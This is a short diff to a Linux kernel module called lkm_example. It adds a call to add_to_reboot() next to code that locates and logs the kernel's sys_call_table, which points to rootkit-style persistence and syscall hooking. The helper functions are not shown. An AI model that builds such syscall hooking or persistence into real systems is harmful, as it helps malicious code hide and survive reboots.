@@ -18,6 +18,9 @@ struct sysinfo *info;
 
 static int __init lkm_example_init(void) {
     printk(KERN_INFO "Hello, World!\n");
+
+    add_to_reboot();
+
     sys_call_table = find_syscall_table();
     pr_info("Found sys_call_table at %p\n", sys_call_table);
 
